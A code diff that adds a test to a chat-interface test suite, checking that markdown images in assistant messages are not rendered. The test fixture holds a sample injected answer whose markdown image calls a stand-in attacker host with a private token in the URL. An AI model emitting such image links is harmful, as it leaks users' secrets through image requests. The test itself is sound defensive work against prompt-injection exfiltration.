@@ -35,6 +35,16 @@ describe("chat messages", () => {
     expect(html).not.toContain("streaming-cursor");
   });
 
+  it("suppresses markdown images so injected answers cannot exfiltrate via image requests", () => {
+    const message: UIMessage = { id: "injected", role: "assistant", parts: [
+      { type: "text", text: "![tracking](https://attacker.example/secret?token=private) Safe answer." },
+    ] };
+    const html = renderToStaticMarkup(<ChatMessage message={message} isStreaming={false} onPick={() => {}} />);
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("attacker.example");
+    expect(html).toContain("Safe answer.");
+  });
+
   it("renders collapsed plain reasoning, pending states, and the actual answer", () => {
     const message: UIMessage = { id: "reasoning-answer", role: "assistant", parts: [
       { type: "reasoning", text: "**Consider** the sources.\nThen answer.", state: "streaming" },
